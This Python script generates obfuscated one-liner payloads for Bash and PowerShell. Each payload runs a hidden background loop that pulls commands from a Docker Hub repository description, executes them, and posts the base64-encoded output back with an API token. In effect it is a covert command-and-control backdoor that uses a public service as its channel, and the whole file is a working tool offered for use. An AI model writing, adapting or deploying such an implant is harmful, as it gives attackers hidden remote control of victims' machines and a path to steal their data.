import argparse
import base64

# Templates for Bash and PowerShell
BASH_TEMPLATE = """(echo "bugatti" ;while true; do output=$( {{ curl -s {repourl} | jq -r '.full_description | fromjson | last.description' | bash 2>&1; }} | base64) ;  
json=$(curl -s {repourl} | jq '.full_description | fromjson');      
updated_json=$(echo "$json" | jq --arg result "$output" '.[-1].result = $result');      
curl -s -X PATCH "{repourl}" -H "Authorization: Bearer {token}" -H "Content-Type: application/json" --data "$(jq -n --argjson full_description "$updated_json" '{{full_description: ($full_description | tostring)}}')" > /dev/null 2>&1;      
sleep 2;  
done)&
"""

POWERSHELL_TEMPLATE = """Start-Job -ScriptBlock {{
    while ($true) {{
        $json = (Invoke-RestMethod -Uri "{repourl}" -Method Get).full_description | ConvertFrom-Json;
        if ($json -and $json[-1].description) {{
            $output = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Invoke-Expression $json[-1].description 2>&1)));
            $json[-1] | Add-Member -MemberType NoteProperty -Name result -Value $output -Force;
            $updatedJson = @{{
                full_description = ($json | ConvertTo-Json -Depth 10 -Compress)
            }} | ConvertTo-Json -Depth 10 -Compress;
            Invoke-RestMethod -Uri "{repourl}" -Method Patch -Headers @{{"Authorization"="Bearer {token}";"Content-Type"="application/json"}} -Body $updatedJson
        }}
        Start-Sleep -Seconds 2
    }}
}}
"""

def encode_base64(command):
    """Encodes a command in Base64 format."""
    return base64.b64encode(command.encode()).decode()

def generate_command(repourl, token, mode="bash", secret="bugattishidden"):
    """Generates a Base64-encoded shell command for Bash or PowerShell."""
    if mode == "bash":
        command = BASH_TEMPLATE.format(repourl=repourl, token=token, secret=secret)
        encoded_command = encode_base64(command)
        return f'echo "{encoded_command}" | base64 -d | bash'
    
    elif mode == "powershell":
        command = POWERSHELL_TEMPLATE.format(repourl=repourl, token=token)
        encoded_command = encode_base64(command)
        return f'([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{encoded_command}"))) | iex'
    
    else:
        raise ValueError("Invalid mode! Choose either 'bash' or 'powershell'.")

def main():
    parser = argparse.ArgumentParser(description="Generate a Base64-encoded one-liner command for Bash or PowerShell.")
    parser.add_argument("--repourl", required=True, help="Docker Hub API repository URL")
    parser.add_argument("--token", required=True, help="Docker Hub API authentication token")
    parser.add_argument("--mode", choices=["bash", "powershell"], default="bash", help="Output mode: bash (default) or powershell")

    args = parser.parse_args()
    
    one_liner_command = generate_command(args.repourl, args.token, args.mode)
    
    print("\n🔹 **One-Liner Command:**\n")
    print(one_liner_command)

if __name__ == "__main__":
    main()
